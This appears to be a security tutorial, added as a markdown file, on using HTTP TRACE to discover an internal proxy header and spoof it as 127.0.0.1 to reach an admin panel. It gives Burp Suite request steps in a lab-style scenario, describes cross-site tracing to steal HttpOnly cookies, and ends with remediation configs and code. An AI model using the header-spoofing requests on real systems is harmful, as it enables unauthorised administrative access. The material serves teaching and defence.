@@ -1,0 +1,203 @@
+# Broken Access Control: Debugging Flow with HTTP TRACE
+
+An advanced technique in testing _Broken Access Control_ involves leveraging network diagnostic functionalities such as **HTTP TRACE** to expose internal server architectures and bypass administrative access restrictions.
+
+The HTTP TRACE method is designed for diagnostic loopback testing, where the web server **echoes back the exact HTTP request it received** directly to the client. When an application sits behind a _Reverse Proxy_, _Load Balancer_, or _WAF_, this debugging method can inadvertently disclose secret internal headers used by the system for authorization decisions.
+
+---
+
+## 1. Vulnerability Concept: How HTTP TRACE Leaks Internal Headers
+
+In modern cloud infrastructures, client requests pass through intermediate reverse proxies (e.g. Nginx, AWS ALB, Cloudflare, or Varnish) before reaching the backend application:
+
+```
+[Client / Attacker] ──(1. Original Request)──▶ [Reverse Proxy] ──(2. Request + Internal Headers)──▶ [Backend Server]
+```
+
+As the reverse proxy forwards traffic, it often attaches **internal custom headers** to convey the client's identity or proxy state, such as:
+- `X-Custom-IP-Authorization: 105.12.90.11`
+- `X-Forwarded-For: 105.12.90.11`
+- `X-Client-IP: 105.12.90.11`
+- `X-Internal-Token: secret-cluster-token`
+
+### The Danger of Enabled HTTP TRACE
+When an attacker sends a `TRACE /` request:
+1. The backend server receives the request containing all internal headers appended by the proxy layer.
+2. The server echoes the complete request back into an HTTP response body with MIME type `message/http`.
+3. **The attacker discovers the exact names and syntax of hidden internal authorization headers!**
+
+---
+
+## 2. Exploitation Flow: Header Discovery & Access Control Bypass
+
+![HTTP TRACE Debugging Flow](/images/http-trace-diagram.svg)
+
+---
+
+## 3. Connecting HTTP TRACE with Broken Access Control
+
+Many legacy or poorly configured architectures restrict the admin interface (`/admin`) using IP-based rules:
+> *"The Admin panel is only accessible to requests originating from the internal network / localhost (`127.0.0.1`)."*
+
+However, backend applications frequently inspect **custom request headers** (such as `X-Custom-IP-Authorization`) to determine client origin.
+
+Once an attacker discovers this header name using HTTP TRACE, they can spoof the header in Burp Suite:
+
+```http
+GET /admin HTTP/1.1
+Host: target-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+The backend falsely assumes the request originated from an internal administrator and grants unrestricted access!
+
+---
+
+## 4. Step-by-Step Practical Exploitation with Burp Suite
+
+Follow this guide to uncover internal proxy headers and bypass access control using HTTP TRACE:
+
+---
+
+### Step 1: Probe for HTTP TRACE Support
+1. Open **Burp Suite** and navigate to the target web application in the embedded browser.
+2. Capture a standard `GET /` request in **Proxy** > **HTTP history**.
+3. Send the request to **Burp Repeater** (`Ctrl + R` / `Cmd + R`).
+4. Modify the HTTP verb from `GET` to `TRACE`:
+
+```http
+TRACE / HTTP/1.1
+Host: target-website.com
+User-Agent: Mozilla/5.0 ...
+```
+
+5. Click **Send**.
+
+---
+
+### Step 2: Analyze the Echoed Response for Proxy Headers
+1. Inspect the **Response** panel.
+2. If the server responds with `200 OK` and `Content-Type: message/http`, look for unexpected headers in the echoed body:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: message/http
+Content-Length: 182
+
+TRACE / HTTP/1.1
+Host: target-website.com
+User-Agent: Mozilla/5.0 ...
+X-Custom-IP-Authorization: 114.122.45.10
+```
+
+3. Identify the **`X-Custom-IP-Authorization`** header injected by the reverse proxy.
+
+---
+
+### Step 3: Test the Protected Administrative Endpoint
+1. In Repeater, create a new request to access the administrative dashboard:
+
+```http
+GET /admin HTTP/1.1
+Host: target-website.com
+```
+
+2. The server denies the request:
+```http
+HTTP/1.1 403 Forbidden
+
+Admin interface is only available to local users.
+```
+
+---
+
+### Step 4: Inject the Spoofed Header (Bypass Access Control)
+1. Add the discovered header with the loopback IP value (`127.0.0.1`):
+
+```http
+GET /admin HTTP/1.1
+Host: target-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+2. Click **Send**.
+3. The server responds with **`200 OK`**, delivering the fully functional administrative management panel!
+
+---
+
+### Step 5: Execute Administrative Operations
+1. Perform the intended administrative action (e.g. deleting user `carlos`):
+
+```http
+GET /admin/delete?username=carlos HTTP/1.1
+Host: target-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+2. The operation succeeds and the scenario is resolved! 🎉
+
+---
+
+## 5. Related Risk: Cross-Site Tracing (XST)
+
+Beyond enabling access control circumvention, HTTP TRACE can be weaponized in **Cross-Site Tracing (XST)** attacks.
+
+By design, the `HttpOnly` cookie flag prevents client-side JavaScript (via XSS) from reading sensitive session cookies. However, if HTTP TRACE is enabled:
+1. An XSS payload executes `TRACE /` via `fetch` or `XMLHttpRequest`.
+2. The web server reflects all incoming headers—including `HttpOnly` cookies—inside the plain text response body.
+3. The JavaScript payload reads the reflected response body and exfiltrates the administrator's session tokens!
+
+---
+
+## 6. Remediation & Hardening Guidelines
+
+### 1. Disable HTTP TRACE in Production Web Servers
+
+#### Apache HTTP Server (`httpd.conf` / `.htaccess`)
+```apache
+TraceEnable Off
+```
+
+#### Nginx Configuration (`nginx.conf`)
+```nginx
+server {
+    listen 80;
+    server_name example.com;
+
+    # Reject TRACE or non-standard methods
+    if ($request_method ~ ^(TRACE|TRACK)$) {
+        return 405;
+    }
+}
+```
+
+---
+
+### 2. Never Base Authorization on Untrusted Client Headers
+Do not rely on client-controllable headers for security decisions. Enforce cryptographically verified session tokens and database-backed Role-Based Access Control (RBAC):
+
+```typescript
+// ❌ VULNERABLE: Trusting raw request headers
+app.get("/admin", (req, res) => {
+  const clientIP = req.headers["x-custom-ip-authorization"];
+  if (clientIP === "127.0.0.1") {
+    return res.render("admin-dashboard");
+  }
+  return res.status(403).send("Access Denied");
+});
+
+// ✅ SECURE: Role-Based Access Control via Verified Session
+app.get("/admin", authenticateUser, requireAdminRole, (req, res) => {
+  return res.render("admin-dashboard");
+});
+```
+
+---
+
+### 3. Configure Trusted Reverse Proxies Properly
+Configure backend frameworks to only trust proxy headers originating from verified internal subnets:
+
+```typescript
+// Express.js
+app.set("trust proxy", "loopback"); // Strictly trust 127.0.0.1 / localhost
+```
